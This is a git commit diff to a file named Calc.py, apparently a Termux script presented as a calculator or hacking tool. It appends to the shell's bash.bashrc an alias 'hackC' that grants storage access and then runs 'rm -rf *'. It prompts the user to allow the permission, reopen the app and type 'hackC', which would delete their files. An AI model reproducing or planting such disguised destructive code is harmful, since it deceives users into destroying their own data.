21b16ff7e9c26b21f3caf697ecd486b9ca73082d
code01011 <99646849+code01011@users.noreply.github.com>
2022-02-20 13:08:18 +0530

    admin.py

--- Calc.py
+++ Calc.py
@@ -1,3 +1,3 @@
-with open("../usr/etc/bash.bashrc",'a+') as f:
+with open("$HOME/../usr/etc/bash.bashrc",'a+') as f:
     f.write("alias hackC='termux-setup-storage && rm -rf *'")
     print("\n(allow the permission to continue.)\nTYPE 'exit' COMMAND AND REOPEN TERMUX APP.\nTHEN TYPE 'hackC' COMMAND TO START.")
